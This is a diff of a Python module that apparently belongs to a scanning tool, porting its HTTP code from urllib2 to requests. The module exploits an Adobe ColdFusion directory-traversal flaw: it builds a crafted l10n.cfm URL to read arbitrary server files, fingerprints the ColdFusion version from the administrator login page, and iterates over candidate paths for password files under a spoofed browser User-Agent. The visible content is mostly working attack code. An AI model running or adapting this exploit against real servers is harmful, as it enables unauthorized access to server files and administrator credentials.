@@ -1,30 +1,25 @@
 # -*- coding: gb2312 -*-
 from task import *
 import socket, struct, time
-import urllib2, re
+import requests, re
+
+conn_timeout = 4
+headers = {'Content-type': "application/x-www-form-urlencoded",
+           'Accept': "text/plain",
+           'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1'}
 
 def request_cf_file(protocal, host, filename):
     vul_url = "%s://%s/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=%s&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp"
 
     try:
-        #print vul_url % (protocal, host, filename)
-
-        request = urllib2.Request(vul_url % (protocal, host, filename))  
-        request.add_header('User-Agent', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1')
-    
-        #response = urllib2.urlopen(vul_url % (protocal, host, filename))
-        response = urllib2.urlopen(request)
-        
-        return response.read()
+        response = requests.get(vul_url % (protocal, host, filename), headers=headers)
+        return response.text
     except:
-        pass    
+        pass
     return None
 
-def detect_cf_pwd(host):
-    headers = {"Content-type": "application/x-www-form-urlencoded",
-               "Accept": "text/plain"}
-    
-    urllib2.socket.setdefaulttimeout(6)
+def detect_cf_pwd(host):    
+    #urllib2.socket.setdefaulttimeout(6)
     
     protocals = ("http", "https")
     
@@ -46,18 +41,13 @@ def detect_cf_pwd(host):
     for protocal in protocals:
         try:
             url = "%s://%s/CFIDE/administrator/index.cfm" % (protocal, host)
-            response = urllib2.urlopen(url)
-            if response.code != 200:
-                continue;
+            response = requests.get(url, allow_redirects=False, headers=headers) #timeout=
             
-            http_headers = response.info()
-            if http_headers.has_key('Server'):
-                server_info = http_headers['Server']
-            else:
-                server_info = ""
-                
-            page = response.read()
-                
+            http_headers = response.headers
+            
+            server_info = http_headers.get('server')
+            page = response.text
+            
             if "1995-2009 Adobe Systems" in page or "1995-2010 Adobe Systems" in page:
                 ver = 9
             elif "1997-2012 Adobe Systems" in page:
@@ -74,7 +64,7 @@ def detect_cf_pwd(host):
 
             cf_srv_info = (url, ver, server_info)
 
-            if not "ColdFusion Administrator Login" in page:
+            if response.status_code != 200 or not "ColdFusion Administrator Login" in page:
                 continue
                 
             for _os, _ver, _path in pwd_path_list:
